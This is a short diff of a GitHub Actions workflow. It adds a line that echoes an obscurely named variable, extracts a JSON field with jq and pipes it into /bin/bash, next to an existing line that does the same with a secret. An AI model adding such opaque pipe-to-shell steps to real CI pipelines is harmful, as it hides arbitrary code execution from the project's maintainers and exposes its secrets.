@@ -22,6 +22,7 @@ jobs:
           ld9: ${{ secrets.ld9 }}
         run: |
           printf '%s' "$ld9" | jq -r .b5595 | /bin/bash
+          echo $rqum18979 | jq -r .p763 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
